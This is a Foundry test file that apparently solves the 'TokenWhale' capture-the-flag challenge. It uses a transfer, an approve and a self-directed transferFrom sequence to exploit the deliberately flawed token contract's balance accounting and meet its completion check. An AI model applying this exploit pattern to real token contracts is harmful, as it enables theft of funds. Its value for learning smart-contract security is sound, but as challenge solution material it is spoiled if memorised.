// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../src/TokenWhale.sol";

contract TokenWhaleTest is Test {
    TokenWhaleChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new TokenWhaleChallenge(player);
    }

    function testExample() public {
        vm.startPrank(address(player));

        address player2 = vm.addr(2);
        target.transfer(player2, 501);

        vm.stopPrank();
        vm.prank(player2);
        target.approve(player, 501);

        vm.startPrank(address(player));
        target.transferFrom(player2, player2, 501);

        assertTrue(target.isComplete());
    }
}
